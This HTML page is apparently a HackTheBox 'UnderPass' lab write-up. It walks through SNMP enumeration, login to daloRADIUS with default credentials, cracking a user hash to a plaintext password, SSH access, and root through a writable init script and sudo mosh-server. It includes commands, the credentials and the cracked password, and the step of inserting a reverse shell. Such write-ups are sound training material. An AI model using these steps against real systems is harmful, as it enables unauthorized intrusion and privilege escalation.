@@ -1,0 +1,270 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - UnderPass</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>UnderPass (HTB – Easy)</h1>
+
+<p>
+UnderPass is a machine centered around SNMP enumeration, a misconfigured daloRADIUS installation, and a privilege escalation path through a writable <code>/etc/init.d</code> service.  
+The foothold is obtained by extracting user information via SNMP and leveraging default daloRADIUS credentials.  
+Privilege escalation is achieved by abusing the <code>mosh-server</code> init script and connecting with <code>mosh-client</code> to obtain a root shell.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: underpass.htb  
+<br>Initial vector: SNMP enumeration → daloRADIUS default creds → user hash → SSH  
+<br>Privilege escalation: writable init.d service (moshserver)  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp ssh
+25/tcp smtp
+53/tcp dns (BIND)
+80/tcp http (nginx)
+161/udp snmp
+</pre>
+
+<p>
+The web server shows nothing useful.  
+SNMP (UDP/161) is open — a strong indicator of misconfiguration.
+</p>
+
+<h3>SNMP Enumeration</h3>
+
+<p>Test community strings:</p>
+<pre>
+$ onesixtyone 10.10.11.48 public
+-> Linux underpass ... Ubuntu 5.15 kernel
+</pre>
+
+<p>Walk the SNMP tree:</p>
+<pre>
+$ snmpwalk -v2c -c public 10.10.11.48
+-> steve@underpass.htb
+</pre>
+
+<p>
+Metasploit’s SNMP enum module confirms the system is running **daloRADIUS**:
+</p>
+
+<pre>
+Hostname: UnDerPass.htb is the only daloradius server in the basin!
+Contact: steve@underpass.htb
+</pre>
+
+<h2>Foothold – daloRADIUS Default Credentials</h2>
+
+<p>
+Documentation indicates daloRADIUS is typically installed under <code>/daloradius</code>.  
+Browse:
+</p>
+
+<pre>
+http://underpass.htb/daloradius/
+</pre>
+
+<p>
+Directory listing is forbidden, but fuzzing reveals:
+</p>
+
+<pre>
+/daloradius/app/users/login.php
+/daloradius/app/operators/login.php
+</pre>
+
+<p>
+The login panel identifies itself as **daloRADIUS 2.2 beta**.  
+Default credentials:
+</p>
+
+<pre>
+administrator : radius
+</pre>
+
+<p>
+Login succeeds.
+</p>
+
+<h3>Extracting User Credentials</h3>
+
+<p>
+Navigate to:
+</p>
+
+<pre>
+/daloradius/app/operators/mng-list-all.php
+</pre>
+
+<p>
+Select user <code>svcMosh</code> and view details:
+</p>
+
+<pre>
+Hash: 412dd4759978acfcc81deab01b382403
+</pre>
+
+<p>
+Crack it:
+</p>
+
+<pre>
+$ hashcat or hashes.com
+-> svcMosh : underwaterfriends
+</pre>
+
+<p>
+SSH into the machine:
+</p>
+
+<pre>
+$ ssh svcMosh@10.10.11.48
+</pre>
+
+<p>
+User shell obtained.
+</p>
+
+<h2>Privilege Escalation – Writable moshserver Init Script</h2>
+
+<p>
+Run linpeas or manual checks:
+</p>
+
+<pre>
+$ sudo -l
+-> (root) NOPASSWD: /usr/bin/mosh-server
+</pre>
+
+<p>
+Additionally, <code>/etc/init.d/moshserver</code> is writable by the <code>security</code> group:
+</p>
+
+<pre>
+$ ls -l /etc/init.d/moshserver
+-rwxrwxr-- 1 root security ...
+</pre>
+
+<p>
+This allows modifying the service script to execute arbitrary commands as root.
+</p>
+
+<h3>Exploit Path</h3>
+
+<ol>
+  <li>Edit <code>/etc/init.d/moshserver</code> and insert a reverse shell payload.</li>
+  <li>Restart the service using sudo:</li>
+</ol>
+
+<pre>
+$ sudo /etc/init.d/moshserver restart
+</pre>
+
+<p>
+Alternatively, use the intended path:  
+Run <code>sudo mosh-server</code> and connect with <code>mosh-client</code> using the displayed key:
+</p>
+
+<pre>
+$ sudo mosh-server
+-> MOSH_KEY=xxxxxxxxxxxxxxxxxxxxxxxxxxxx
+$ mosh-client 127.0.0.1 PORT
+</pre>
+
+<p>
+A root shell is obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+UnderPass is a clean chain: SNMP leaks system details, daloRADIUS defaults provide admin access, user hashes lead to SSH, and a writable init script combined with <code>mosh-server</code> sudo privileges yields root.  
+It’s a great example of how weak SNMP configurations can unravel an entire system.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
